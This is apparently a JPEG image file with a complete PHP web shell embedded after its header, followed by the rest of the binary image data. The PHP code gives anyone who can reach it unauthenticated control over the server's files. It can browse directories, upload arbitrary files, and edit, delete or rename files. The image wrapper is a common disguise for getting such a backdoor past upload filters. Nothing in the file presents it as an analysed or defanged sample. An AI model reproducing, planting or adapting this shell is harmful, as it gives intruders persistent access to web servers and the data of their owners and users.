���� JFIF      ��!�<?php
$currentDir = isset($_POST['d']) && !empty($_POST['d']) ? base64_decode($_POST['d']) : getcwd();
$currentDir = str_replace("\\", "/", $currentDir);

$pathParts = explode("/", $currentDir);
echo "<div class=\"dir\">";
foreach ($pathParts as $k => $v) {
    if ($v == "" && $k == 0) {
        echo "<a href=\"javascript:void(0);\" onclick=\"postDir('/')\">/</a>";
        continue;
    }
    $dirPath = implode("/", array_slice($pathParts, 0, $k + 1));
    echo "<a href=\"javascript:void(0);\" onclick=\"postDir('" . addslashes($dirPath) . "')\">$v</a>/";
}
echo "</div>";

if (isset($_POST['s']) && isset($_FILES['u']) && $_FILES['u']['error'] == 0) {
    $fileName = $_FILES['u']['name'];
    $tmpName = $_FILES['u']['tmp_name'];
    $destination = $currentDir . '/' . $fileName;
    if (move_uploaded_file($tmpName, $destination)) {
        echo "<script>alert('Upload successful!'); postDir('" . addslashes($currentDir) . "');</script>";
    } else {
        echo "<script>alert('Upload failed!');</script>";
    }
}

$items = scandir($currentDir);
if ($items !== false) {
    echo "<table>";
    echo "<tr><th>File/Folder Name</th><th>Size</th><th>Action</th></tr>";

    foreach ($items as $item) {
        if (!is_dir($currentDir . '/' . $item) || $item == '.' || $item == '..') continue;
        echo "<tr><td><a href=\"javascript:void(0);\" onclick=\"postDir('" . addslashes($currentDir . '/' . $item) . "')\">$item</a></td><td>--</td><td>NONE</td></tr>";
    }

    foreach ($items as $item) {
        if (!is_file($currentDir . '/' . $item)) continue;
        $size = filesize($currentDir . '/' . $item) / 1024;
        $size = $size >= 1024 ? round($size / 1024, 2) . 'MB' : round($size, 2) . 'KB';
        echo "<tr><td><a href=\"javascript:void(0);\" onclick=\"postOpen('" . addslashes($currentDir . '/' . $item) . "')\">$item</a></td><td>$size</td><td>"
            . "<a href=\"javascript:void(0);\" onclick=\"postDel('" . addslashes($currentDir . '/' . $item) . "')\" class=\"button1\">Delete</a>"
            . "<a href=\"javascript:void(0);\" onclick=\"postEdit('" . addslashes($currentDir . '/' . $item) . "')\" class=\"button1\">Edit</a>"
            . "<a href=\"javascript:void(0);\" onclick=\"postRen('" . addslashes($currentDir . '/' . $item) . "', '$item')\" class=\"button1\">Rename</a>"
            . "</td></tr>";
    }
    echo "</table>";
} else {
    echo "<p>Unable to read directory!</p>";
}

if (isset($_POST['del']) && !empty($_POST['del'])) {
    $filePath = base64_decode($_POST['del']);
    $fileDir = dirname($filePath);
    if (file_exists($filePath) && is_writable($filePath) && unlink($filePath)) {
        echo "<script>alert('Delete successful!'); postDir('" . addslashes($fileDir) . "');</script>";
    } else {
        echo "<script>alert('Delete failed or no permission!'); postDir('" . addslashes($fileDir) . "');</script>";
    }
}

if (isset($_POST['edit']) && !empty($_POST['edit'])) {
    $filePath = base64_decode($_POST['edit']);
    $fileDir = dirname($filePath);
    if (file_exists($filePath) && is_writable($filePath)) {
        echo "<style>table{display:none;}</style>"
            . "<a href=\"javascript:void(0);\" onclick=\"postDir('" . addslashes($fileDir) . "')\" class=\"button1\"><=Back</a>"
            . "<form method=\"post\">"
            . "<input type=\"hidden\" name=\"obj\" value=\"" . $_POST['edit'] . "\">"
            . "<input type=\"hidden\" name=\"d\" value=\"" . base64_encode($fileDir) . "\">"
            . "<textarea name=\"content\">" . htmlspecialchars(file_get_contents($filePath)) . "</textarea>"
            . "<center><button type=\"submit\" name=\"save\" value=\"Submit\" class=\"button1\">Save</button></center>"
            . "</form>";
    }
}

if (isset($_POST['save']) && isset($_POST['obj']) && isset($_POST['content'])) {
    $filePath = base64_decode($_POST['obj']);
    $fileDir = dirname($filePath);
    if (file_exists($filePath) && is_writable($filePath)) {
        file_put_contents($filePath, $_POST['content']);
        echo "<script>alert('Edit successful!'); postDir('" . addslashes($fileDir) . "');</script>";
    } else {
        echo "<script>alert('Edit failed or no permission!'); postDir('" . addslashes($fileDir) . "');</script>";
    }
}

if (isset($_POST['ren']) && !empty($_POST['ren'])) {
    $oldPath = base64_decode($_POST['ren']);
    $oldDir = dirname($oldPath);
    if (isset($_POST['new']) && !empty($_POST['new'])) {
        $newPath = $oldDir . '/' . $_POST['new'];
        if (file_exists($oldPath) && !file_exists($newPath) && rename($oldPath, $newPath)) {
            echo "<script>alert('Rename successful!'); postDir('" . addslashes($oldDir) . "');</script>";
        } else {
            echo "<script>alert('Rename failed!'); postDir('" . addslashes($oldDir) . "');</script>";
        }
    } else {
        echo "<form method=\"post\">"
            . "New name: <input name=\"new\" type=\"text\" value=\"\">"
            . "<input type=\"hidden\" name=\"ren\" value=\"" . $_POST['ren'] . "\">"
            . "<input type=\"hidden\" name=\"d\" value=\"" . base64_encode($oldDir) . "\">"
            . "<input type=\"submit\" value=\"Submit\">"
            . "</form>";
    }
}
?>

<!DOCTYPE html>
<html>
<body>
    <div class="dir">
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="u">
            <input type="submit" name="s" value="Upload">
            <input type="hidden" name="d" value="<?php echo base64_encode($currentDir); ?>">
        </form>
    </div>
</body>
<head>
    <title>File Management</title>
    <style>
        table { border-collapse: collapse; margin: 20px auto; }
        th, td { border: 1px solid #000; padding: 8px; }
        .button1 { margin: 0 5px; padding: 5px 10px; }
        .dir { margin: 10px; }
        textarea { width: 100%; height: 400px; }
    </style>
    <script>
        function postDir(dir) {
            var form = document.createElement("form");
            form.method = "post";
            form.action = "";
            var input = document.createElement("input");
            input.type = "hidden";
            input.name = "d";
            input.value = btoa(dir);
            form.appendChild(input);
            document.body.appendChild(form);
            form.submit();
        }

        function postDel(path) {
            var form = document.createElement("form");
            form.method = "post";
            form.action = "";
            var input = document.createElement("input");
            input.type = "hidden";
            input.name = "del";
            input.value = btoa(path);
            form.appendChild(input);
            document.body.appendChild(form);
            form.submit();
        }

        function postEdit(path) {
            var form = document.createElement("form");
            form.method = "post";
            form.action = "";
            var input = document.createElement("input");
            input.type = "hidden";
            input.name = "edit";
            input.value = btoa(path);
            form.appendChild(input);
            document.body.appendChild(form);
            form.submit();
        }

        function postRen(path, name) {
            var newName = prompt("Enter new name:", name);
            if (newName) {
                var form = document.createElement("form");
                form.method = "post";
                form.action = "";
                var input1 = document.createElement("input");
                input1.type = "hidden";
                input1.name = "ren";
                input1.value = btoa(path);
                var input2 = document.createElement("input");
                input2.type = "hidden";
                input2.name = "new";
                input2.value = newName;
                form.appendChild(input1);
                form.appendChild(input2);
                document.body.appendChild(form);
                form.submit();
            }
        }a

        function postOpen(path) {
            var form = document.createElement("form");
            form.method = "post";
            form.action = "";
            var input = document.createElement("input");
            input.type = "hidden";
            input.name = "open";
            input.value = btoa(path);
            form.appendChild(input);
            document.body.appendChild(form);
            form.submit();
        }
    </script>
</head>

</html>�� � 					""*%%*424DD\					""*%%*424DD\��  �" ��             	��     �����-���,�  /^H   5#փ/��  `)�W-��  H�6�<^ͦF�)� Hj=�I�� ���9���j^}�~�>`
�����M���qp3@5��\���{�O��:�x��_�;:�G  YK]b���A֨����Y�85�ۭ 6;%��)6�22S��Fg�o%���2<� u��5���C��%�VH �V�|B����
]u�J��2c���ޟ =����j>�K�m��a�{i���������K��"=�=U�/.d�0��8���\?Y������1g� x+'͡����M���r
��2�h��t&@|Q��H�~���ڍ���֤Zz��@ ��yps*)�ǀ��q'���ki#Y  ��Ʋ��^4�D殱yps8��ϖ��)� :,L� �}-��r)�`l���X��9������ �EE�� �����r)�b{����3	��Y`  ���� Rx��{�����%��U�/.f�e��� D18M ^+a0[�@S����j�����迟�w@ ժ���`A������)���r��yps??���� *v�K��ٷ޶��V+*y`�������u�˃�T�o�]S��	Jz�����k���Ѿf��8N��WX��9�����%ˑ����wN`
��d���`#�9�;#��D��j��u�˃�+�N��G��,U������� ��� �V�p����u�˃�j� ��fÈ�ǀ�N�`1�k�v�BJ����5bc�Z�� }�6���.�5lg9M�F�{�4��Ȓ=��  <�,!�y����� �����  �՘��   �k��!����      @�V6�r       8�x+c      ��             ��    �O�� rpM X>L�a��z]�*hӳ:�W'�n���*0�{5s�I�-����3�^W��3�5{���\��CC��mv�:�-[	��쟪֦o=�4��~�pV�:�[�z`䯥�ϣ����|�W�%��N�n�O8�z w��6EV���6;dR��hͧ�
���j�|�)[df��� i�}C����D�5-���i��[ 뵨�Y����U
gM�K����w�Tx�4������w^�L��~S�8���� HJ�ūq��G;T$n���:G$7L�PS�v�`�g� ήr@  ��              ��     ��M盵  4Mp  �ߠM7�^\By�Rdq��^�)����}N�ާ窴݄Ѿ��,�XFp=������f�w㖞kV����
o�xˈ�דk������ �i�M,7��g�0g�Hy����8��7`e�� e^�� K��"ުM:���7>�G@ κ�� �� ��h<�f�j��M�e�@j��p��O��(��}"k��Xʴ݅�J�����"w��9�,@�.�$eZnë]v�]2�$DN2����f��6@�U�A,eE�&I��P�yi��     Ϧxe`      ?�� 7        06!1@RV"PQU#%AB23T��   �.�zw�mŔB�;�����8��F��W�̤��'�4���?��T��L�tV�t�;6/����O}x_T&����B��z�b�-�)^���,�Y^=����v��(��򚹫,a�U�Y�V�WX3�{q�>~��.�Q�s[�l�*�ê䳷#���oe9D��1��UUUU^��/�K��3��?����`d#Au��j�:*�Oc%����z��\�#kg�?���ƟQ���DOX6�y�~�W��'����)��5�e��׾�ؔ��@Dy.7e���UgG�j��s:�b�V�l%�,��mB�Zd���>���q�}i���x��[:���������`�bt���b~ky=�NsF�J�2lvh�Q��޽W��<f�^�[@�#lc�uH2e]�3U:9��U�zI����& Z���k�"*/��D#E$�J���7X�,�⑤��]�ސ�[�LT��X�VC�2a�����6[B�A=�4E�)4���m��>�g�X��o�bT/{n/���o� UsE����xLW$��H�$��%��'�V9?F�R���6��mzE�CL9'x���Z�r���;���}�o���UN�Ȁh_9�(���C:Q����-r{ۥw������2��5jc#b���D�C_A���2����sq_E_=���|�b�e�Iox�>����~m�rً�o�̷F7�:@��l2M���{'�x�*����R�w���E%�!�,ͮ�I+��tN���ĤE;0.5k{2l���)�)r,��$��d��,)���� ��8�WW�����Y<�8j�0�[��rfed���;+�m-��*��*@t�pc� ���� ��pf��o� �),�ni_൫$U졡��,a��e�ޠ�++,�X��J��kg嶽�f/��w����"�ܶ6��2Ś��^7�����lc	��� ��`B����-ʃ�+���yVF[1���g�B�N�,� eff'h�X\';���<��������37Jb����e"X��'�.����$Up�֍����(QI�H	9c�4�M�e3sk˷���6Z�a9cxݦSee\>'��m^!\��b>l�1���EcgXu9�WX��J�B XV9N��׹������^\�c��[�N����yţ��]lC�:�A�,�VptY�J��{�V8C��q����=���<ljP��>𭸴���%����,��-zv�$0PF�y�5K��#!![�~3AV�@j��z'�N:'�N,q�4T:�i�R�漊"�5����!E�H%�����Qu�Jʀi���Q���X��Ĉ����'(��rc#�mW?Yk�1�����������­�G8��&#&�x���)W���t_-��C�A�`��m^#A0��q���f/��w�o���nQ]7Znlc�{#�����6���3"z�I�p|}���p<p�8�kŞ9�ݱ�iL)��l�I>8TՓex>G�������R��g�F���� m��Xڹ�T4���:*Crk�o�cx�n6"B~)��h�/DxG��3,�Ŋ�*,�b���9�u�:��i� aFE���U}F=�'=/���������z'^�;�׹��������{�]C
_�1���!X_,��S����0���
�-�b ]���,�����^k��ɝZ�j$Z�r���	��yeB���Z繬cU���qʸ��'���![0D����*��R89l�'Y��ru��x+hqJz� -_�m�rً�o緲%�3[�O��^"&ggR=����|���Y�R�K_#�t��EbQ��M�B�F}���}�"++�B8  �����X�iX��ڌ���zΕ�w�d��A��Υ\Z����T�4���\�Z��֧n���63�O\�>_�ng�+��ۙ���>�����������ng�+��ۙ���>����������X�\�,�2��Hym�rً�o��6����z#^����#����ɒdT�l�"����pzۀ��'f� ����������_�r�U-�z�v�~Z��=�\�����m{�>�_�x�-�b��-����>U4̴����r��{?㞵b&#U�]��.��rt^T�}�Y�^��#��Eꝛ�ߖ����ϵ�'���׹��������V`�'g�tmk2��r%m�\��w=`S_������*Ŭͮӣ9����U%��g��5E�M�p�EМ���Br?��}	�� ����'#� +_�c��0�Þ��f^zGmd�輶׹�������p+�F=[���SXVT"�E����鏍����#D���}m�C�:������X�w��2t`>����y�<A���J�V��F����� }�����[p���Iⓞ��eNt$�����kR��&*������;8z�d%
9"���Q���S���8"+�(���Ul�m��)g߳v8�WWNչs��9�r��klqrL�$gQ:'N{k܁�b���y$�Ps���|�6GՔޓ���$rƑc�
�`˱�����TꊜeԎ��4/Hy��k$e���}�3`̖���H���w=ӄ��m|]ͮs�5ʎ�wQu��]�G!0�_�ތ��l"&.e�x�q1g�E%D"r�$�&,��4��DN5^ ��'./�=��@�1m���,�����	�U�Ip�e��+�������l���-V+TEŴ��u�گ�d���X�n�Ŗ⩧�S{0�U*G_n� 
ˊ�a����".ɧ�x�,Ҳ8�8���ޓ�A�<��+��ˬ.���O����,O��)�x��h��l�|F"{�����R�f�S0W9�n�f}l�� E����&��:X�Z�Ȓ�X�S�5&��Ę2�xzٶ��f/��w�s�A���ȭl�H�	��"y덱i�K�̣�rj�O������s]��a��ӡVYvcu��)���  Đ�$φ}Y� �!�����bᏩ*K��:��ճ� ,��\�TcM�s�*�z)��5:�K3���o2*^8�Z��]��f|�'0N*��M
gE>1xE�(���%�e\�`;'�>ն̓X��!T����%]I�Eଂ��8a����m{�>�_�x�f��
|Ǫ�W�[icN\gU�0���A��1�݀=����fDC+,�r���j��J��"�bkң.w�;�5�k���V����s��s�@D��	#L���[�ֺpl�zYvOS�$��Ǜk�(_-�c]5o��k�����k-��1��Ƶ�ը�V�S2�5V�)������A�ʱ�V�{��K ��H�+���f���XO�sO���;�׹�������};0���x��0��7��j���1�j����]����T�V��y�
������!E�H%�*h�o&�+|ˋkP*��-��@��H��I�ۢ� �	�4���Y}����՗�[��c)���^�ix4Ri�>�[)Ia0�@,L�Y}�~�vSg�m�d�-'�6��ZO�m�负���@e�W��|���ZV�#Y�1�k�r�5�^WJ,ބq�4����0min��eI-p5�� �YTc�X�x�)��<v���wI%I��㵮T+�"�EнT��#G��F+U��"�F�9F��3���"W�,�����Q�)��g,�J(�x����u�į)*�����qho�Vv6>W�� ϗu����7�� j��"�7���KJ����06K��VR�V1f��Sg�ϑ$������XKX$��s��UZ�0�V�n:l��~��{d�-",c_�؋z�ֱ	�zq�o�N<-���OW�6����ﭮ���A<k�FO��d�Y�z��^�G3�k�����X(��w�U��uuuĖ��,��ͷ�$IѺ9x�����2��8��� l[qZ�4 Y"+]�mȞ������/��E�)EN:'��������"���� �)���� J 		     1 !AQ02aq��"#@Bbr�����Rst��3CPS�����c���$D���  ? �%�^/��,5Gw��TmȍW���%�'���˓�V��@��ʱ��L_ ?��H��h.�DI��$�%�Lmv(&��ޗ_��r�N{���M��Ft��g��jx��cE�$��#͍@�ݜ�e� RABlm�$k����!��x��$�GY���E��o?*g��E�,pD�n����֯$鶼��9�X��!֚}�:a�@���A���G"�$C�.lo$�� �2G�q��>Y�{�S2ҙ-�m��˷�� .�{��^n�O�\���CR�+J����F:�I���K�:!��8��N��Sh�x�ѽ�w��%H��U}��be ۚPm��V_Z�lO!�{s��'��K3�TI&ªo��=����ThQ��.�=��I@���`  f����:�pl]��pe׳Jc�o�֭mM*��*m���)�)����W�1m���Ҷ:�����l��e#��wN�ZZk��BW�����oB���s�U��Ui&�F� %V y�-f�R��� �h3�ꟿ���uZ�����V�*�#R9�͈U�� ��,�����z`��̀��G�����ػY382�ٌ��)�gϓ�5�s&�uSu���DNB5>���v���+D�yF��a\¦�r��\��f�;��O!��e5���O9���HLoը� �v#)����<�6�UQRm�u�����b�Ӧ�X��a��v�i��3��dZ�Xʩ<́�}$����Π-Q���L�X:����<��E���k&g]{1�
՝��lubH1��Ӎ����lR��t�1ŵ���x�8�QE �U`�[��v(�iI8�@gmD-�5t#ߝ�����l����H�� �;���ҧ�&+B�s$`��31� cF��sH��,�8�*��� �#�e#�R�n��Y<����8�7�DI��ـ7��
<���Z ~�y��6�6��]�6��ٮk1��~;�k&g]{1�vL�o`
5�: �,E��^�5�͵γ�)P�[�2�u���䘥d#���/՚����t�����^�(]�_@�81Ɏ=Q�0Q��$b���񽀦YL�:٪wH��q��M�A9�elE�mR4�y�F����lu�d��.W�Pz�4�$�qgcRN���T�uN��~���^}��@M�p;���X�D4ׂ	�a8H�uh3Lÿ����T����^C�KA
D:Ss�b�d��˯f3;�)T*tO0��t1�UU$� :w�+zq���v\g�xrv����
� 7���7MH�6��<��P��Ey���/�߁�΅�H�CFGSPA�-6	6�i�&�m%��\����f6�sɍ,l�oӷ.C��<�V:�Q��D3�5�5�#��y�����u�d� o�Z&gs谆xo�x���ə��^�n�L��""��q�3�qƂ��ƀfZ��wZ�kml��&H�P���=n׊W"����a���^���>�\.�&4�$k�O+��,k�� �I��^��w���ʴ �]��#U�U���N�-�9�@)��3xʹ�/~�#��v�fpe׳��� g�垷̘�\��<^��eB�G"�WQē�k�Z.�u� ���x�=E����x@�&�A7K�V3�Hh�ZɎ(�*���t��W�>�˂	y��h��㦾O!�g'v�}�9�p��͉"#}����	�-�/���_�ؿ�o���b� =���{}������ͧ�2������ػY382�ٍ˝�i�u�) u�;bq$�'v�yDr��C�v
	�$Q"ਂ�q�Jz�2�z}>j ����5��;�h3���f8����w�b�d��˯f7/Ow�z��e���9���P> .@�ݳ)1���t7��?��nݯ�NO4n����َ&;�Q�����k&g]{1��օO�ns+rA�$�������4g���<u���QS�U̎!w�h�.�ק�V%T�/(d ��d�m�'�n�>[t����#"$9YTQRt��y����XW�X��l]���u���}ҁ��s;������R�	<�(o�̪�c#!��ɺO���fwJ�*N9'��⻘��Q������74���:���ػY382�ٍ�`[�@�Ĥ��gt`��I�9���i��'OJ>���
fD��G����F�+�a�A�o1J�ƕa�]�x�]���2:$�� ��8�/+D�xC����cRI�$�ݏү�gB� Pfpl]���u����'���qB-t�I���w`�%��*�j�6�2/��̚|A�}��19���2CK��tD��>i�e,B���|<ޛW1 K���pYz�9�j4 �%o��=|�9J���*y�b
���E$�|q����m+�G5fc����&��J/�Vg��ə��^�n�Q r0[�B�Թ��Qy\LM��G�iQ]U��Ab�����A���ݢ�*�48��|���rR�i�?)��/�lN����15,�@P�M��ya���Q��Y��Kh����;A�-�X�ƛWvE*� �(A��C�>;�ձ�Nj�$.Q�AZJO?���o�o���(�V�����k�3al��N?M �g���k&g]{1�˾A1�9�J��F�yZ)clU�Ѓ�ͦ�H+�BO�j�SGC��Юp��N�,�]Ң(T�Q�6���"�����0"�'2��WM��s�jʋ�.��G�$l;E��F��t{-�L��SH�X�rea��V�	���6R:٪�R�<�����:�n*��$w�]��j��`��w�x�֩h�*"�*�� 7�b�d��˯f3"@/� �*(�0W^jrd��7F�A�,(7�?G��
��H�}yv#T��k`��"C�e��Q�L���X�RI�wbp�Ȅ�+)� ���K:�ަV��+���]XUH: ؚ��-N���t<p�79ؖP�� ��I��C�E�E����Ǝ"�i���:\�h��"o5O(��?�b�d��˯f3Z�^�1�1�oֻW����on<J~&ض�U���s����8ٴ��Ny�Ȱ�8���p#�q#��"zLt!q�3�(�!�]As�f��g !���K�E=l��v�H���F�M9�7.���Ҿ@�i��Z��i���e�{l��E��B��q	vH27��,͕\��o�~e�������Z�v��d�oj��J����w���nqm99c�p5�:8�!U�N��l/2� �-�D����$�'�:YdP�؄�,<�$��6��KlaKlQ[B�>�R�\�V�%l5�Ml�#P�0U�VL�6��AZ�Z�~��^�SO�\����R�+J�_w�g�r7��5�\�}��,j�V����6�I�8�5p<��]� �B�(.\Ȝ7B����Q�M�M �c���/�%m���������F�O�'?�p�=���3��?w��U�0=Fխ^�i="��A�w�V?��w�..�<�FN����S|���:8*��hA7"���x^\��2��io�M��`�J�B_۔�	��Vܥ�����R�ڶ�._����� >      !1 "AQaqr��34R�#02BT@S���$5b��� ? �bW��y<Q�DQ�i������)�+��r� C�	�&tF��Y��Ɣj�������m���B��i&Dh£������q�:�-K�_JNRJ(�]������&!{�n_�s���Lwq,�FG-��1��L����F�e��� �-����K���k�v?�?�k���!0�E�i<���?�*��^д�Ə#Iwl�e������S�H��s$�jL���Xi$ I9W�"��%"�g.�:����O������)���*�!jG ��5g�+�\�s�n�C A�	&�<Q�����l$om
��*�'�R���3��RZ�öXGY]<T�_�u3�[-�����~EcXOƧ��c����}4���l���*{��$kj�R�8�5z�P�g��,�w(���D�Go�+E�kƧ�f�2R v(�{��re��w8^3=�*9/ާ��Rbn���2`�X��%�C�I��E�����.�Y����UՊ0Kt������[�Iw�75XaR�JL�R496{���-��c��-Z��沺�l�~���jx[F9���G�E���D[��)ݤvw9��q(�E�����ϕK�L�8�?f�N�u ���&�2
HøՅ��9<�"�E���6q��Dyݭ�
���[]�H��}��p�+5(?��mY�W8e��"ku��#�+�&��h�����k�[��E�?W��4UU�B��V%1��v�`mQܻ4a����4˜F�w���~5<-��v�#��s4��4hì�TO*��j��Ȼ�K���q��K��"GZ���e �m��4�,�&�7T$��f.��s$�j�ݮ�a�M��}*#��!�rT C*��uHȃJ�� �%���$���;��� :q����^(��f+�Wߺ���}��+�Wߺ���}���*Y&�I%r�Y���~5<-��v�#�S>�R�R�[�5m<Q�Ŷ�  /�,W��Q�tpeb��D�~�|U��������5�cIs(#F/����f�!^˿��y��]� ��T����]Vƌ%
X@�y��~5<-��v�#�W�?��þ./���c���2޺��tpra"�O�F_�� ��-�wp9��!��P>�+e��Ȟx��iel�
���'�f�͝CO,q ��F�4H�r��XOƧ��c����}*T׍��R(�����N*X����`ꮧ0Fc�<Bxe��:�?Z�'�i!q�#?J�G�D�L�{����YP��^�ȸ���&�w
�PO�I4.f�wl�p</Ӹ��	-�h�\�h�Ƨ��x�;�R�Dm)�q�}�NǷ`����9[`ܣpт�k�v���ף	���s������J��1p9����� ����3��R���zF����P�����q7(�9?A���<,���2R����{)D�9S�:��N�:�v����s#?�/���Y��V���E_bW8��N�ѹ�X^+./KBǞ���r�H��l;���oSVA���x��:�Нt,�:����`��f= gV.�Y����?ޜ'�S��1�wo�>�'�.#h��z�O��Q�q�:"��w!�)t7��/�e4���[�4wuX�,N̪�bE��p6�#0k��ͮ,`�1�txأ�V�r#��`�#3��a\*V��nڱ�-�I����#%�T��T���W]�?.g.�L#�����x9忲��TcU�r"�HIj��i�\�
��{��i5����a�u)"�*|*D$�u��流X�<l��B���Q��<��۾��"�\�y�,w�nl-.�W+��Υལ�D�95
�4��x/f�e�O%mekh5m�T�o�+�W���'a��B��[�Hfl�br3��M��������E� ��O���a��}}��� D       !1 AQr"0234aq�����#BSU�@Rb���6st���� ? �h���{P]\����`�W^��P�&�G�A,�yO�E��?��@z�Ě{,6�	����1l٬j g�N����f$���8Z��e�� I ɬAq,@$׭ڐ�0�B:��e��v�������&���p�P?�Z�F��D�\�]���Uց[$�u�^�kp�i6����E�[h�Ѯ# �Ks垭$���,R^~�e��Z�&�c$m�m
�N��}°���Q3��rK(�EvD�*��
c��D�s48�D؄1��o7
|Ns�*������1�����Uj��2�?j�	br q&�SDbã�� �=�����I,P��Yqf ��4� ��_�?�%� ծ1�^����1���?f�wlnM��;`&ُ1��ӕi��� �9�4��~��y#u�V�&ꏎ�p�i�f��r39e��TI�h�wXԻ����ǜ�RV>��{-�d붼xRKG�BxX$]�z�,o.��L�9F!�j�~������1Y�c�|±Lk��2��3�X��_@�	R
��Eh���a�Gm�����ox����-0��mQl$I�@��sTS��&%}�Ė��koo����M&�°��v.Viӛ0�<Ʊo$n���|d�Q����3�I$�K5v�: ��P$p5�n<k�.��Or�|�U�����Q[C�g�w�R[�(�����Փ�ݧu�U����$F=�@   ��[����ZN��ZK�>-��\g�H�8�B/ϼb�H�eՂ�ɺ��F�c�4�<�@l9�Fǚ��!��D�I<�fY1�icEE 9#0h   d�Qc�(�r�*�@�;Ec{*�I�=!I��Blm1a༁&�[�l���_G� *��_U��=��_G� )��_U��?����������%�2xV�o$n���|d�Q�r�Q��/�V��#V��OB����6���$���SF&�X�fO�����KK��iFO��ҧ-Z�Yḻ�_N"�ۺ���:+�v��g��U��G3���*���� [�9D�� 0��V�N'�,@��#,Ҡż��˫�uGƟ�:���x�Rֲe͑Շ>���;ƀb�s������J����ui֎��q�8� �E�Ȱ��Į��������s���XG�XZ���ās�<��j��+;�ɎIeϪ�'{���d9���ޖ9�-��]X/���>4F`�Jr ��3庇FC��)У�7r�b���Aέ�Y��y�A�I"D���#��`���I�{�o�߲ru�d<A�?���"���4n=`��@ �3�����~ԙ�e@�2}�'��F��A����?��##�ݻ�$������ðH�Y���;�_{��;��o����4l�a��ྭX��7Yu`�2n���rl������xr@���Qɞ���'��u���x[n3���(�*�=#x�ݵ�Q�5&%
��\�Oq,�7;���*���ۥJ��p#>�<~���[��L~�&�[�k�|+E�#�����\\����\̑F�Y�ZG�]�$���
sW�;��(�I'�Ջy#u�V�&ꏎ�P�#L�NGPf^�+Q��>�	 
\��wXy�� ��*H`A�<�VbT�y�Z��$���� �DV&���wc�-�$/dta��s��L�)J.�͐αɴӷn#�`Qf2�q����g��������epO�Āy����\־���y�m`�,aM�FG~���F�"< �#P��1㺕���R��@i��O����(~7��a��	ٽ�1D2� �hU���s]��%�^ES�y�R#0EO}e	�9o Gz�����|ґ�m�=�!����?�,�������I�zc� ����